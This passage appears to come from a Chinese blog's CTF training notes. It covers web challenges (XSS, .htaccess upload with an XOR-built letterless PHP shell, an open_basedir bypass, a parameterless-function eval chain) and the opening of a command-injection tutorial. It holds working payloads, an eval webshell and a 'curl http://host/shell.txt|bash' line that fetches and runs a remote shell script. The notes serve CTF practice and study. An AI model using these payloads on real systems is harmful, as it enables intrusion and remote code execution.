会生成img标签，而且已经渲染，但不会弹窗探测： <span class="token operator">/</span>x<span class="token operator">%</span><span class="token number">27</span><span class="token operator">-</span><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>domain<span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">&lt;</span>iframe<span class="token operator">/</span>srcdoc<span class="token operator">=</span><span class="token string">'&lt;script src="x%27-alert(document.domain)-%27">&lt;/script>'</span><span class="token operator">></span>打： <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span>htaccess<span class="token operator">?</span><span class="token operator">%</span>253ciframe<span class="token operator">%</span>252fsrcdoc<span class="token operator">%</span>253d<span class="token operator">%</span><span class="token number">2527</span><span class="token operator">&lt;</span>script<span class="token operator">%</span>2520src<span class="token operator">%</span>253d<span class="token string">"x%252527-alert%2528document%252edomain%2529-%252527"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>252fscript<span class="token operator">></span><span class="token operator">%</span><span class="token number">2527</span><span class="token operator">></span>        <span class="token comment" spellcheck="true">//配合iframe的srcdoc属性，通过script标签，加载x'-alert(document.domain)-'路径下的内容当作js执行，内容是这个：404 - 'File "x'-alert(document.domain)-'" was not found in this folder.'</span>最终导致弹窗<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="14-SVG-XSS"><a href="#14-SVG-XSS" class="headerlink" title="14. SVG XSS"></a>14. SVG XSS</h1><p><strong>链接：</strong></p><p><strong>考点：</strong></p><p><strong>参考资料：</strong></p><h1 id="15-Json-Cat"><a href="#15-Json-Cat" class="headerlink" title="15. Json Cat"></a>15. Json Cat</h1><p><strong>链接：</strong><a href="http://catweb.zajebistyc.tf/" target="_blank" rel="noopener">http://catweb.zajebistyc.tf/</a></p><p><strong>考点：</strong></p><p><strong>参考资料：</strong></p><p><strong>1、</strong>Confidence2020-Web题解  <a href="https://hpdoger.cn/2020/03/15/title:%20Confidence2020-Web%E9%A2%98%E8%A7%A3/" target="_blank" rel="noopener">https://hpdoger.cn/2020/03/15/title:%20Confidence2020-Web%E9%A2%98%E8%A7%A3/</a></p><h1 id="16-template-js"><a href="#16-template-js" class="headerlink" title="16. template js"></a>16. template js</h1><p><strong>链接：</strong><a href="https://templejs.zajebistyc.tf/" target="_blank" rel="noopener">https://templejs.zajebistyc.tf/</a></p><p><strong>考点：</strong></p><p><strong>参考资料：</strong></p><p><strong>1、</strong>Confidence2020-Web题解  <a href="https://hpdoger.cn/2020/03/15/title:%20Confidence2020-Web%E9%A2%98%E8%A7%A3/" target="_blank" rel="noopener">https://hpdoger.cn/2020/03/15/title:%20Confidence2020-Web%E9%A2%98%E8%A7%A3/</a></p><h1 id="17-hardweb"><a href="#17-hardweb" class="headerlink" title="17. hardweb"></a>17. hardweb</h1><p><strong>链接：</strong><a href="http://139.224.236.99:8667/" target="_blank" rel="noopener">http://139.224.236.99:8667/</a></p><p><strong>考点：</strong>无数字字母shell + .htaccess文件上传 + 绕过open_basedir/disable_function</p><p><strong>参考资料：</strong></p><p><strong>1、</strong>文档：writeup.note<br>链接：<a href="http://note.youdao.com/noteshare?id=76ca44341bd234158e8ec635affcea2d&amp;sub=B06DF4E3E2E840A28A9ECA60BDE4CF8A" target="_blank" rel="noopener">http://note.youdao.com/noteshare?id=76ca44341bd234158e8ec635affcea2d&amp;sub=B06DF4E3E2E840A28A9ECA60BDE4CF8A</a></p><p><strong>2、</strong>writeup1：<a href="https://blog.csdn.net/qq_39563369/article/details/103285011?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">https://blog.csdn.net/qq_39563369/article/details/103285011?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task</a></p><p><strong>3、</strong>writeup2：<a href="https://www.cnblogs.com/wangtanzhi/p/12250386.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangtanzhi/p/12250386.html</a></p><p><strong>4、</strong>writeup3：<a href="https://www.cnblogs.com/20175211lyz/p/11488051.html" target="_blank" rel="noopener">https://www.cnblogs.com/20175211lyz/p/11488051.html</a></p><p><strong>5、</strong>writeup4：<a href="https://xz.aliyun.com/t/6042#toc-21" target="_blank" rel="noopener">https://xz.aliyun.com/t/6042#toc-21</a></p><p><strong>6、</strong>PHP动态特性的捕捉与逃逸<br><a href="https://www.leavesongs.com/PENETRATION/dynamic-features-and-webshell-tricks-in-php.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/dynamic-features-and-webshell-tricks-in-php.html</a></p><p><strong>7、</strong> 利用htaccess绕黑名单，mail绕过disable function   <a href="https://xz.aliyun.com/t/3937" target="_blank" rel="noopener">https://xz.aliyun.com/t/3937</a></p><h2 id="17-1-思路"><a href="#17-1-思路" class="headerlink" title="17.1 思路"></a>17.1 思路</h2><p>没有思路，就是掌握太少！！！</p><p>题目源码：</p><pre class="line-numbers language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span><span class="token keyword">function</span> <span class="token function">get_the_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// webadmin will remove your upload file every 20 min!!!! </span>    <span class="token variable">$userdir</span> <span class="token operator">=</span> <span class="token string">"upload/tmp_"</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$userdir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$userdir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$tmp_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/ph/i"</span><span class="token punctuation">,</span><span class="token variable">$extension</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"^_^"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">//扩展名不能带有ph,用.htaccess</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'&lt;?'</span><span class="token punctuation">)</span><span class="token operator">!==</span>False<span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"^_^"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//mb_strpos()返回要查找的字符串在另一个字符串首次出现的位置，不能有&lt;?</span>        <span class="token comment" spellcheck="true">//绕过方式1：</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>@<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>        <span class="token comment" spellcheck="true">//这道题php版本为7.2，无法使用绕过方式1</span>        <span class="token comment" spellcheck="true">//绕过方式2，用base64编码绕过</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">exif_imagetype</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"^_^"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">//读取图像的第一个字节，并检查其签名</span>        <span class="token variable">$path</span><span class="token operator">=</span> <span class="token variable">$userdir</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token variable">$name</span><span class="token punctuation">;</span>        @<span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">,</span> <span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//将上传的文件移动到新位置</span>        <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$hhh</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'_'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$hhh</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$hhh</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'One inch long, one inch strong!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span><span class="token punctuation">,</span> <span class="token variable">$hhh</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>       <span class="token comment" spellcheck="true">//过滤的有[ \x00 - 空格 0-9 A-Z a-z ' " ` ~ _ &amp; . , | = [ \x7F</span>    <span class="token comment" spellcheck="true">//加号匹配前面的子表达式一次或多次，例如"zo+"能匹配"zo"和"zoo"，但不能匹配"z"。+等价于{1,}。</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Try something else!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$character_type</span> <span class="token operator">=</span> <span class="token function">count_chars</span><span class="token punctuation">(</span><span class="token variable">$hhh</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//count_chars(),包含在$hhh中使用过的不同字符。</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$character_type</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Almost there!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$hhh</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="17-1-1-fuzz测试和无数字字母shell"><a href="#17-1-1-fuzz测试和无数字字母shell" class="headerlink" title="17.1.1  fuzz测试和无数字字母shell"></a><strong>17.1.1</strong>  fuzz测试和无数字字母shell</h3><p><strong>1、</strong>根据题目正则滤过机制，写脚本查看还剩下哪些可见字符。</p><p><strong>2、</strong>php代码中没有引号的字符都作为字符串。</p><p>构造：${_GET}{phpinfo}();</p><pre class="line-numbers language-php"><code class="language-php">绕过可见字符的检测<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token string">"_GET"</span><span class="token operator">^</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token operator">%</span>ff<span class="token operator">%</span>ff<span class="token operator">%</span>ff<span class="token operator">%</span>ff<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">%</span><span class="token constant">A0</span><span class="token operator">%</span><span class="token constant">B8</span><span class="token operator">%</span><span class="token constant">BA</span><span class="token operator">%</span><span class="token constant">AB</span>payload<span class="token punctuation">:</span><span class="token operator">?</span>_<span class="token operator">=</span>$<span class="token punctuation">{</span><span class="token operator">%</span><span class="token constant">A0</span><span class="token operator">%</span><span class="token constant">B8</span><span class="token operator">%</span><span class="token constant">BA</span><span class="token operator">%</span><span class="token constant">AB</span><span class="token operator">^</span><span class="token operator">%</span>ff<span class="token operator">%</span>ff<span class="token operator">%</span>ff<span class="token operator">%</span>ff<span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>ff<span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token operator">%</span>ff<span class="token operator">=</span>phpinfo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="17-1-2-绕过exif-imagetype"><a href="#17-1-2-绕过exif-imagetype" class="headerlink" title="17.1.2  绕过exif_imagetype()"></a><strong>17.1.2  绕过exif_imagetype</strong>()</h3><p>加文件头\x00\x00\x8a\x39\x8a\x39，这个是wbmp文件的文件头，要么在winhex里加，要么用python的bytes类型，例如：b”\x00\x00\x8a\x39\x8a\x39”。这里是六个字节， 写shell的时候后面要再加两个字节，凑够8字节，满足base64解码规则。例如：b”\x00\x00\x8a\x39\x8a\x39”+b”00”</p><p>.htaccess中以0x00开头的同样是注释符，不会影响到.htaccess。</p><h3 id="17-1-3-绕过disable-function"><a href="#17-1-3-绕过disable-function" class="headerlink" title="17.1.3 绕过disable_function"></a>17.1.3 绕过disable_function</h3><pre class="line-numbers language-php"><code class="language-php">c<span class="token operator">=</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'xxx'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">'/THis_Is_tHe_F14g'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="18-Boring-code"><a href="#18-Boring-code" class="headerlink" title="18. Boring code"></a>18. Boring code</h1><p><strong>链接：</strong><a href="http://139.224.236.99:8123/" target="_blank" rel="noopener">http://139.224.236.99:8123/</a> (多了一点限制！！)</p><p><a href="http://203.195.224.127:8123/" target="_blank" rel="noopener">http://203.195.224.127:8123/</a></p><p><strong>考点：</strong>代码审计+代码执行</p><p><strong>参考资料：</strong></p><p><strong>1、</strong>【SSRF】如何绕过filter_var(), preg_match() 和 parse_url()  <a href="https://www.jianshu.com/p/80ce73919edb" target="_blank" rel="noopener">https://www.jianshu.com/p/80ce73919edb</a></p><p><strong>2、</strong>writeup：<a href="https://www.cnblogs.com/BOHB-yunying/p/11616311.html#38yMmYAA" target="_blank" rel="noopener">https://www.cnblogs.com/BOHB-yunying/p/11616311.html#38yMmYAA</a></p><p><strong>3、</strong>正则分析： <a href="https://regex101.com/" target="_blank" rel="noopener">https://regex101.com/</a></p><h2 id="18-1-思路"><a href="#18-1-思路" class="headerlink" title="18.1 思路"></a>18.1 思路</h2><p>题目源码：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">function</span> <span class="token function">is_valid_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">filter_var</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token constant">FILTER_VALIDATE_URL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token shell-comment comment"># filter_var — 使用特定的过滤器过滤一个变量</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/data:\/\//i'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_valid_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$r</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/baidu\.com$/'</span><span class="token punctuation">,</span> <span class="token variable">$r</span><span class="token punctuation">[</span><span class="token string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/[a-z]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token keyword">NULL</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">//这里的迭代正则匹配无参数函数</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">echo</span> <span class="token string">'bye~'</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"error: host not allowed"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"error: invalid url"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre><code>只能执行类似  a(b(c())); 的代码同时还有一些黑名单et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|logflag在上一个目录的index.php里面首先要走到上一个目录现在已经能够切回到上一层目录 var_dump(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))));phpversion()返回php版本，如7.3.5floor(phpversion())返回7sqrt(floor(phpversion()))返回2.6457513110646tan(floor(sqrt(floor(phpversion()))))返回-2.1850398632615cosh(tan(floor(sqrt(floor(phpversion())))))返回4.5017381103491sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))返回45.081318677156ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))返回46chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))返回.var_dump(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))扫描当前目录next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))返回..echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))))))))))))));chdir(next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))))))返回Truelocaltime(time(True))返回一个数组最终的exp：一echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))))))))))))));二  http://203.195.224.127:8123/echo(join(file(end(scandir(next(each(scandir(chr(floor(tan(tan(atan(atan(ord(cos(chdir(next(scandir(chr(floor(tan(tan(atan(atan(ord(cos(fclose(tmpfile()))))))))))))))))))))))))))));</code></pre><h1 id="19-ezcms"><a href="#19-ezcms" class="headerlink" title="19. ezcms"></a>19. ezcms</h1><p><strong>链接：</strong><a href="http://139.224.236.99:8124/" target="_blank" rel="noopener">http://139.224.236.99:8124/</a></p><p><strong>考点：</strong>源代码泄露+hash长度扩展攻击+phar反序列化</p><p><strong>参考资料：</strong></p><p><strong>1、</strong>ByteCTF_2019&amp;XNUCA_2019部分web题复现  <a href="https://blog.csdn.net/qq_42181428/article/details/100659865" target="_blank" rel="noopener">https://blog.csdn.net/qq_42181428/article/details/100659865</a></p><p><strong>2、</strong>利用SoapClient类进行SSRF+CRLF攻击  <a href="https://blog.csdn.net/qq_42181428/article/details/100569464" target="_blank" rel="noopener">https://blog.csdn.net/qq_42181428/article/details/100569464</a></p><p><strong>3、</strong> N1CTF Easy&amp;&amp;Hard Php Writeup   <a href="https://xz.aliyun.com/t/2148" target="_blank" rel="noopener">https://xz.aliyun.com/t/2148</a></p><h1 id="20-hardRCE"><a href="#20-hardRCE" class="headerlink" title="20. hardRCE"></a>20. hardRCE</h1><p><strong>考点：</strong>代码执行+反弹shell（因为``没有回显，所以最好反弹shell）</p><p><strong>题目</strong>：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$cc</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cc'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$cc</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php"><code class="language-php">payload：<span class="token operator">?</span>a<span class="token operator">=</span>`<span class="token variable">$cc</span>`<span class="token punctuation">;</span>curl http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//host/shell.txt|bash;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF_TRAINING </category>
          
      </categories>
      
      
        <tags>
            
            <tag> training </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>best_rce</title>
      <link href="/2020/04/30/best-rce/"/>
      <url>/2020/04/30/best-rce/</url>
      
        <content type="html"><![CDATA[<h1 id="1-rce基础"><a href="#1-rce基础" class="headerlink" title="1  rce基础"></a>1  rce基础</h1><h2 id="1-1-前言"><a href="#1-1-前言" class="headerlink" title="1.1 前言"></a>1.1 前言</h2><p>命令注入攻击（command/shell injection）是通过目标主机上某个程序的漏洞来执行攻击者想要执行的命令。命令注入攻击常用在向程序传入不安全参数（命令行参数、http头、cookie）。 </p><h2 id="1-2-特殊符号"><a href="#1-2-特殊符号" class="headerlink" title="1.2 特殊符号"></a>1.2 特殊符号</h2><p><strong>|</strong></p><blockquote><p>连结上个指令的标准输出，作为下个指令的标准输入。 </p><p>例如：cat /flag|wc -c</p><p> -c或–bytes或–chars   只显示Bytes数。 </p></blockquote><p><img src="/2020/04/30/best-rce/3.png" alt="|"></p><p><strong>&amp;</strong></p><blockquote><p>用户有时候执行命令要花很长时间，可能会影响做其他事情。最好的方法是将它放在后台执行。后台运行的程序在用户注销后系统还可以继续执行。当要把命令放在后台执行时，在命令的后面加上&amp;。 </p></blockquote><p><strong>Linux中的&amp;&amp;与||</strong> </p><blockquote><p>shell在执行某个命令的时候，会返回一个返回值，该返回值保存在一个shell变量中，变量为0表示执行成功，变量为1时表示执行失败。有时候，下一条命令依赖前一条命令是否执行成功。 shell提供了&amp;&amp;和||来实现命令执行控制的功能，shell将根据&amp;&amp;或||前面命令的返回值来控制其后面命令的执行。  </p><p>&amp;&amp;：在成功地执行一条命令之后再执行另一条命令 。</p><p>||： 在一条命令执行失败后再执行另一条命令 ，也就是说如果第一条执行成功，后面那一条就不会执行了。</p></blockquote><p><strong>&amp;&amp;</strong></p><blockquote><p>语法格式如下：[command1 &amp;&amp; command2 [&amp;&amp; command3 …]  </p><p>命令之间使用  &amp;&amp; 连接，实现逻辑与的功能。只有在&amp;&amp;左边的命令返回真（命令返回值为0），&amp;&amp;右边的命令才会被执行，只要有一个命令返回假（命令返回值为1），后面的命令就不会被执行。</p></blockquote><p><strong>||（双管道符）</strong></p><blockquote><p>语法格式如下：[command1 || command2 [|| command3 …] </p><p>命令之间使用 || 连接，实现逻辑或的功能。只有在 || 左边的命令返回假（命令返回值为1），||右边的命令才会被执行。这和c语言中的逻辑或语法功能相同，即实现短路逻辑或操作。</p><p>只要有一个命令返回真（命令返回值为0），后面的命令就不会被执行。 </p></blockquote><p><strong>;(分号)</strong> 